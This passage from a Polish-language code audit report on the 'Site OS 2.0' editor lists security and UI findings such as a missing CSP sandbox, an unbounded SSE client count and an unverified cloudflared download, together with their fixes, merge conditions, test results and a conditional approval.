| **F-04** | **P2** | `src/lib/siteOs.ts:42` | `\s` w wyrażeniu regularnym `DATA_URI_RE` przy nieujętym w cudzysłów `src=data:image/... alt="x"` pochłania spację i nazwę kolejnego atrybutu. | Zmienić `[A-Za-z0-9+/=\s]{256,}` na `[A-Za-z0-9+/=]{256,}` (lub dopuścić wyłącznie znaki nowej linii wewnątrz cudzysłowów). |
| **F-05** | **P2** | `site-os/server.mjs:31, 267, 615` | Brak górnego limitu `MAX_SSE_CLIENTS` na `/api/events` oraz przekazywanie `token` w parametrze URL `?token=`. | Dodać limit np. `16` klientów SSE i przekazywać autoryzację sesji edytora przez lokalne ciasteczko `HttpOnly; SameSite=Strict`. |
| **F-06** | **P2** | `site-os/server.mjs:707`, `site-os/public/app.js:1194`, `src/lib/siteOs.ts:191` | Zakończenie wolnej komendy AI nadpisuje bieżący widok edytora bez pytania (poprzedni stan trafia do `versions[0]`); `siteOs.ts` wysyła cały odchudzony HTML zamiast wycinka jednej sekcji DOM. | Porównywać `updatedAt` przed automatycznym przeładowaniem w `app.js` (pytanie o scalenie/podgląd wersji) oraz wycinać pojedynczy węzeł `<section>` przy zaznaczeniu. |
| **F-07** | **P2** | `site-os/server.mjs:391-401` | Automatyczne pobranie `cloudflared-linux-amd64` sprawdza rozmiar `>= 5 MB`, lecz nie weryfikuje oficjalnej sumy kontrolnej `.sha256`. | Pobierać plik `.sha256` z GitHub Releases Cloudflare i weryfikować `crypto.createHash('sha256')` przed `chmod 755`. |
| **F-08** | **P2** | `src/styles/index.css`, `site-os/public/styles.css` | (a) Dymek `.toast` ma wyższy `z-index` niż `.sheet` i zasłania nagłówek/przycisk `×` na `360px` i `844×390`; (b) niskokontrastowy `<input>` na ekranie `.onboard` w `body.theme-light`; (c) brak układu `<768px` dla samego edytora `Site OS` (`330px` overflow na telefonie). | Obniżyć/przesunąć `.toast` pod nagłówek otwartego `.sheet`, dodać `body.theme-light .onboard input { background:#fff; color:#0f172a; }` oraz `@media (max-width: 768px)` w `site-os/public/styles.css`. |
| **F-09** | **P3** | `site-os/public/styles.css:748` | Pusta linia na końcu pliku wykrywana przez `git diff --check` (kod wyjścia `2`). | Usunąć nadmiarową pustą linię na końcu `site-os/public/styles.css`. |
| **F-10** | **P3** | `project-memory/CURRENT_STATE.md:8` | Migawka wskazuje przedostatni commit `6c9e13a` i `zmiany w drzewie: TAK` (zapisana tuż przed commitem `b020365`; `memory:verify` przechodzi poprawnie). | Po scaleniu uruchomić `npm run memory:check` i zatwierdzić świeży stan. |

---

## 10. Warunki przed scaleniem i przed promocją do `main`

1. **Warunek dla scalenia `feat/master-interface-polish` → `fix/production-integration`:**
   - Gałąź **może zostać bezpiecznie scalona (`fast-forward`)** do `fix/production-integration`, ponieważ nie zawiera blokerów `P0`, nie psuje żadnego istniejącego testu (`3 114/3 114 PASS`, `10/10 Xvfb E2E PASS`) i nie powoduje konfliktów Git.
2. **Warunki obowiązkowe przed scaleniem `fix/production-integration` → `main` (około 15 minut pracy naprawczej):**
   - **Warunek 1 (`F-01`, P1):** Dodać `sandbox allow-scripts allow-forms allow-popups;` do nagłówka `Content-Security-Policy` na `GET /p/:projectId` w `site-os/server.mjs:578` (oraz blokadę `Origin: null` na `/api/session`), aby zamknąć lokalny odczyt `runtime.token` przez niezaufany HTML otwarty w `Otwórz stronę`.
   - **Warunek 2 (`F-04`, `F-05`, `F-08b`, `F-09` — szybkie poprawki higieniczne P2/P3):** Usunąć `\s` z `DATA_URI_RE` w `src/lib/siteOs.ts:42`, dodać `MAX_SSE_CLIENTS` w `site-os/server.mjs`, poprawić kontrast `body.theme-light .onboard input` i `z-index`/pozycję `.toast` względem `.sheet`, usunąć pustą linię z `site-os/public/styles.css:748` oraz odświeżyć `npm run memory:check`.
   - **Warunek 3 (odbiór sprzętowy właściciela):** Wykonać 10–15 min test odbiorczy na fizycznym Ubuntu (natywna binarka Electron + `Site OS 2.0` + lokalna `Ollama`).

---

## 11. Lista kontrolna gotowości do scalenia (Merge Readiness Checklist)

- [x] Drzewo robocze czyste, brak niezatwierdzonych zmian i konfliktów z `fix/production-integration` (`fast-forward` z `4ec1594`).
- [x] Lokalny i zdalny `HEAD` (`b020365`) zsynchronizowane 1:1 na `origin`.
- [x] Zero nowych zewnętrznych zależności npm.
- [x] Skan sekretów (`secret-scan --all`) czysty (`0` wycieków).
- [x] `eslint .` i `tsc -b` przechodzą z kodem `0` i zerem ostrzeżeń.
- [x] Pełny zestaw Vitest (`370/370` plików, `3 114/3 114` testów) oraz kontrakt ES2019 (`s9RegexGuard`) przechodzą w `100%`.
- [x] Żywy test E2E na `Xvfb :99` (`10/10 PASS`) oraz żywe testy penetracyjne tunelu i Magic Bytes `Site OS 2.0` przechodzą bez błędów.
- [ ] Zamknięcie jednowierszowej luki `F-01` (`CSP: sandbox` na lokalnym `GET /p/:projectId`) przed promocją na `main`.
- [ ] Odbiór fizyczny natywnej binarki Electron na Ubuntu właściciela.

---

## 12. Odpowiedzi na 5 kluczowych pytań właściciela

1. **Czy można scalać?**
   **Tak, warunkowo (`APPROVED WITH CONDITIONS`)** — gałąź można czysto scalić (`fast-forward`) do `fix/production-integration`, pod warunkiem domknięcia przed wejściem na `main` poprawki `F-01` (`CSP: sandbox` na lokalnym `/p/:projectId`).
2. **Co jest największym zagrożeniem?**
   **`F-01 (P1)`**: otwarcie lokalnego podglądu pełnoekranowego `http://127.0.0.1:3210/p/:projectId` (`Otwórz stronę`) bez dyrektywy `CSP: sandbox` pozwala złośliwemu skryptowi wewnątrz zaimportowanego lub wstrzykniętego pliku HTML odczytać `runtime.token` z `GET /api/session` na tym samym originie `127.0.0.1:3210` (podczas gdy podgląd wewnątrz ramki edytora `Podgląd JS` jest już prawidłowo odizolowany).
3. **Co trzeba naprawić przed scaleniem (lub bezpośrednio na `fix/production-integration` przed `main`)?**
   Dodać `sandbox allow-scripts allow-forms allow-popups;` do `Content-Security-Policy` w `site-os/server.mjs:578` (`F-01`), usunąć `\s` z `DATA_URI_RE` w `src/lib/siteOs.ts:42` (`F-04`), ograniczyć `MAX_SSE_CLIENTS` w `site-os/server.mjs` (`F-05`), poprawić nakładanie `.toast` na nagłówek `.sheet` oraz kontrast pola `.onboard input` w `theme-light` (`F-08`), i usunąć pustą linię EOF w `site-os/public/styles.css:748` (`F-09`).
4. **Jakie testy rzeczywiście przeszły?**
   W niniejszym audycie uruchomiono i zaliczono: `secret-scan --all` (`0.35s`), `npm run lint` (`21.86s`), `npx tsc -b` (`25.09s`), `npx vite build` (`14.10s`, porównany z bazą `4ec1594`), `npm run memory:verify`, pełny `npx vitest run` (**`370/370` plików, `3 114/3 114` testów**), `site-os` smoke, `npm run tools:verify`, żywy `npm run test:e2e:xvfb` (**`10/10 PASS`**), autorską sondę penetracyjną HTTP dla `Site OS 2.0` oraz wielowymiarową sondę wizualną Chromium CDP (`360px`, `390px`, `844px`, `1440px`, zoom `125%/150%`, motywy). Nie uruchomiono jedynie natywnej binarki Electron i fizycznych urządzeń audio/GPU (ograniczenie VM).
5. **Czy `Site OS 2.0` jest gotowy do normalnego użytkowania?**
   **Tak na komputerze (desktop) dla zaufanych projektów i bezpiecznego udostępniania przez Cloudflare Tunnel** — izolacja tunelu (`403` dla panelu i API), walidacja Magic Bytes (`415` dla SVG/HTML), odchudzanie obrazów Base64, historia 20 wersji, SSE i trwałość po restarcie działają stabilnie. Po dodaniu 1 linii `CSP: sandbox` na `/p/:projectId` (`F-01`) będzie bezpieczny również przy otwieraniu lokalnego podglądu niezaufanych importów HTML.

---

## 13. Końcowy status odbioru

APPROVED WITH CONDITIONS
